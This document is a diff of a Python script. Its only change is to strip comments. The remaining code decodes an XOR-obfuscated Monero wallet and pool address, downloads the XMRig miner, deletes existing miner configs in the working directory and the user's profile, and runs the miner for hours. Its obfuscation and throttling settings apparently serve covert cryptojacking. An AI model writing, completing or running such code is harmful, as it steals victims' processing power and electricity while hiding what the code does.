@@ -8,14 +8,12 @@ import threading
 import urllib.request
 import zipfile
 
-# Force flush
 def debug_print(*args, **kwargs):
     print(*args, **kwargs)
     sys.stdout.flush()
 
 debug_print("=== Script started ===")
 
-# ========== Obfuscated data (XOR key = 85) ==========
 ENCODED_WALLET = [
     97, 108, 0, 2, 1, 34, 59, 39, 45, 27, 13, 60, 109, 48, 24, 1, 22, 36, 49, 22, 96, 0, 102, 48, 60, 24, 29, 39, 5, 15, 62, 35, 35, 55, 38, 12, 27, 102, 2, 16, 49, 48, 97, 58, 108, 7, 12, 48, 55, 60, 45, 32, 56, 23, 22, 22, 44, 96, 58, 22, 49, 58, 6, 30, 62, 6, 103, 0, 99, 33, 108, 50, 13, 31, 19, 47, 31, 27, 62, 45, 13, 22, 98, 33, 31, 100, 0, 36, 97, 32, 62, 44, 96, 23, 5
 ]
@@ -23,6 +21,7 @@ ENCODED_WALLET = [
 ENCODED_POOL = [
     37, 58, 58, 57, 123, 38, 32, 37, 37, 58, 39, 33, 45, 56, 39, 123, 54, 58, 56, 111, 97, 97, 102
 ]
+
 def decode(encoded, key):
     return ''.join(chr(b ^ key) for b in encoded)
 
@@ -33,7 +32,6 @@ POOL = decode(ENCODED_POOL, XOR_KEY)
 debug_print(f"Decoded wallet: {WALLET[:10]}...")
 debug_print(f"Decoded pool: {POOL}")
 
-# ========== Rest of script ==========
 RUNTIME_MINUTES = 180
 MIN_WORK = 1
 MAX_WORK = 8
@@ -93,7 +91,6 @@ def main():
     exe_path = download_xmrig()
     working_dir = os.path.dirname(exe_path)
 
-    # Delete any existing config files
     config_paths = [
         os.path.join(working_dir, "config.json"),
         os.path.join(os.environ['USERPROFILE'], ".xmrig.json"),
@@ -134,7 +131,6 @@ def main():
         ]
 
         debug_print(f"[+] Starting miner: {' '.join(cmd)}")
-        # Run miner and capture output to see errors
         miner_proc = subprocess.Popen(
             cmd,
             cwd=working_dir,
